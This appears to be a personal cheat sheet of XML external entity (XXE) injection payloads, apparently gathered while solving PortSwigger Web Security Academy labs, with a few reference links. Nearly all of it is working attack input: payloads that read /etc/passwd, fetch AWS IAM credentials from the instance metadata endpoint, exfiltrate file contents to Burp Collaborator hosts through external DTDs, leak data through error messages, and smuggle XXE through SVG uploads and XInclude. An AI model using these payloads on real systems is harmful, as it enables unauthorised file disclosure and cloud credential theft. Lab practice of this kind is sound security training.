<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://rzu3myo95gq0y3qt4gppvjmf56bzzo.burpcollaborator.net"> ]>
<stockCheck><productId>1</productId><storeId>&xxe;</storeId></stockCheck>


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://w30e27jb97pwr6wmdhzd8ae0hrnhb6.burpcollaborator.net"> ]>
<stockCheck><productId>%xxe;</productId><storeId>1</storeId></stockCheck>



<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://vdcdc6taj6zv156lng9ci9ozrqxjl8.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a2c000a036b0f9bc03d212b01f200b3.web-security-academy.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>



<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

https://www.imagetotext.info/

https://gist.github.com/jakekarnes42/b879f913fd3ae071c11199b9bd7ba3a7?short_path=f3432ae

https://www.exploit-db.com/docs/49732






<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>




<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///ahjsgdkuaysgdujkaysgdujkaysd/%file;'>">
%eval;
%error;

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://exploit-0a3e006203087e62c0b81ac8010e0028.web-security-academy.net/exploit.dtd"> %xxe;]><stockCheck><productId>%xxe;</productId><storeId>1</storeId></stockCheck>





productId=%3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%49%6e%63%6c%75%64%65%22%3e%3c%78%69%3a%69%6e%63%6c%75%64%65%20%70%61%72%73%65%3d%22%74%65%78%74%22%20%68%72%65%66%3d%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%2f%3e%3c%2f%66%6f%6f%3e&storeId=1







